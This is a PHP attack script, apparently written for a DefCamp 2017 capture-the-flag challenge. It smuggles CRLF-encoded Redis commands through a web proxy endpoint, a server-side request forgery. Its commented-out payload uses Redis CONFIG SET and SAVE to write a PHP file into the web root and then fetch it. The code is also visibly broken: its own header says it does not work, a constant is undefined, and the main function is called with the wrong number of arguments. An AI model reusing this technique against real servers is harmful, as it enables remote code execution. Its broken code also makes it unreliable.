<?php

/* Do not publish, does not work as intended */

define('TARGET', 'https://sandbox.secure-httpbin.dctf-quals-17.def.camp/');
// define('DOMAIN', 'YOUR.DOMAIN.TLD');
define('DOMAIN', 'abc.example.com');

function exploit($url, $exploit) {

    $exploit = implode("\r\n", $exploit);
    $exploit = str_replace(' ', '%20', $exploit);
    $exploit = str_replace('?', '%3F', $exploit);
    $exploit = str_replace("\r", '%0d', $exploit);
    $exploit = str_replace("\n", '%0a', $exploit);

    $payload = http_build_query([
        'method' => 'GET',
        'url'    => $exploit,
        'data'   => '',
    ]);

    $data = http_build_query([
        'payload'   => $payload,
        'signature' => md5(SECRET . $payload),
        'action'    => 'exec',
    ]);

    $options = [
        CURLOPT_URL            => TARGET . '?nolog',
        CURLOPT_RETURNTRANSFER => true,
        // CURLOPT_HEADER     => true,
        // CURLOPT_VERBOSE    => true,
        // CURLOPT_STDERR     => fopen('php://stdout', 'w'),
        CURLOPT_POSTFIELDS     => $data,
    ];

    $curl = curl_init();
    curl_setopt_array($curl, $options);
    curl_exec($curl);
}

$file   = md5('.dctf-test-' . uniqid()) . '.php';
$url    = 'https://' . DOMAIN . ':6379/';
$upload = [
    'SET HACKED HACKED',
    /*
    'CONFIG SET dir /var/www/sandbox',
    "CONFIG SET dbfilename {$file}",
    'SET x \'<?php echo "\n" . (1338-1) . "\n"; unlink(__FILE__); ?>\'',
    'SAVE',
    'DEL x',
    "CONFIG SET dir /var/lib/redis",
    "CONFIG SET dbfilename dump.rdb",
    */
];

exploit($upload);
echo PHP_EOL . file_get_contents(TARGET . $file) . PHP_EOL;
